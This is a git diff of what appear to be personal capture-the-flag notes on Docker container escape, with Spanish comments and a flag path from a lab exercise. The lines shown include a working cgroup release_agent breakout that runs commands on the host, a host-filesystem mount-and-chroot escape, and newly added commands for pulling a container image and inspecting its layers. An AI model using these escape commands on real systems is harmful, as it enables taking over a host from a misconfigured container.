@@ -21,7 +21,7 @@ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 # Misconfigured Privileges (capsh)
 capsh --print | grep 'sysadmin'
 
-# exploit:
+# exploit
 mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
 echo 1 > /tmp/cgrp/x/notify_on_release
 host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
@@ -31,5 +31,12 @@ echo "cat /home/cmnatic/flag.txt > $host_path/flag.txt" >> /exploit
 chmod a+x /exploit
 sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 
+# docker enum:
+# revisando layers
+docker pull public.ecr.aws/h0w1j9u3/grinch-aoc:latest
+docker save -o aoc.tar public.ecr.aws/h0w1j9u3/grinch-aoc:latest
+
+cat manifest.json | jq
+cat f886f00520700e2ddd74a14856fcc07a360c819b4cea8cee8be83d4de01e9787.json | jq
 
 
